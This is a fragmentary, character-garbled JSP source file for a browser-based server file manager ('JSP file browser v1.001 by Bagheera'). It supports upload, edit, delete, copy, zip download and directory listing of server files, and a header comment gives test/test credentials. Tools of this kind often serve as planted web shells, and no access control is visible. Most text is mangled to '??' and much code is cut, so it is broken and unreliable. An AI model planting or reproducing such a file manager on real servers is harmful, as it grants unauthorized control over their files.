...
**************************************************************************************
*#######????????????????????????????:                    *
**http://jmmm.com/web/index.jsp    ????:test  ??:test                          *
**************************************************************************************
*/
...
if ((request.getContentType()!=null)&&(request.getContentType().toLowerCase().startsWith("multipart"))){
  ...
  if (!error) request.setAttribute("message", "??????.");
}
else if (request.getParameter("editfile")!=null){
%>
<title>JSP?????-????:<%=request.getParameter("editfile")%></title>
</head>
<body>
...
%></textarea>
  ...
  <td><input type="Submit" name="Submit" value="??"></td></tr>
  <tr><td><input type="checkbox" name="Backup" checked>??</td></tr>
  </table>
  </form>
  </body>
</html>
...
//????
  ...
  for (int i=v.size()-1;i>=0;i--){
    ...
    if (!f.canWrite()||!f.delete()){
      request.setAttribute("message", "??????"+f.getAbsolutePath()+". ????");
      error = true;
      break;
    }
  }
...
//????
  ...
  else request.setAttribute("message", "?????"+new_dir+"??");
}
//????
  ...
  if ((file_name.trim()!="")&&!file_name.endsWith(File.separator)){
    ...
    else request.setAttribute("message", "????"+new_file+"??");
  }
  else request.setAttribute("message", "??: "+file_name+"?????");
}
//????
  ...
  if ((!error)&&(v.size()>1)) request.setAttribute("message", "????????");
  else if ((!error)&&(v.size()>0)) request.setAttribute("message", "??????");
  else if (!error) request.setAttribute("message", "?????");
}
//????
  ...
  try{
    for (int i=0;i<v.size();i++){
      ...
      if (f_old.isDirectory()) f_new.mkdirs();
        ...
        //????
        request.setAttribute("message", "????"+f_old.getAbsolutePath()+",??????,????");
        error = true;
        break;
      }
    }
...
%>
<title>JSP?????-????:<%=request.getAttribute("dir")%></title>
</head>
<body>
<table>
<tr><td>
...
<%
  ...
  out.println("<th bgcolor=\"#c0c0c0\"></th><th title=\"???????\" bgcolor=\"#c0c0c0\"><a href=\""+cmd+"&sort=1\">???</a></th>"+
  "<th title=\"??????\" bgcolor=\"#c0c0c0\"><a href=\""+cmd+"&sort=2\">??</th>"+
  "<th title=\"??????\" bgcolor=\"#c0c0c0\"><a href=\""+cmd+"&sort=3\">??</th>"+
  ...
  for (int i=0;i<entry.length;i++){
    ...
    out.println("<td>?????????<span style=\"background-color: rgb(255,255,255);color:rgb(255,0,0)\">");
        ...
        if (entry[i].canRead())
          ...
          if (entry[i].canRead()){
            if (entry[i].canWrite()){
              ...
              dlink=ahref+browser_name+"?downfile="+name+"\">??</a>";
              elink=ahref+browser_name+"?editfile="+name+"\">??</a>";
            }
            else{
...
<tr>
<td title="?????????"><input class="button" type="Submit" name="Submit" value="Save as zip"></td>
<td colspan="2" title="??????????"><input class="button" type="Submit" name="Submit" value="Delete Files"></td></tr>
<tr>
...
<hr>
<center><small>JSP ????? v1.001 By Bagheera<a href="http://jmmm.com">http://jmmm.com</a>
</small></center>
</td></tr></table>
</body>
</html>
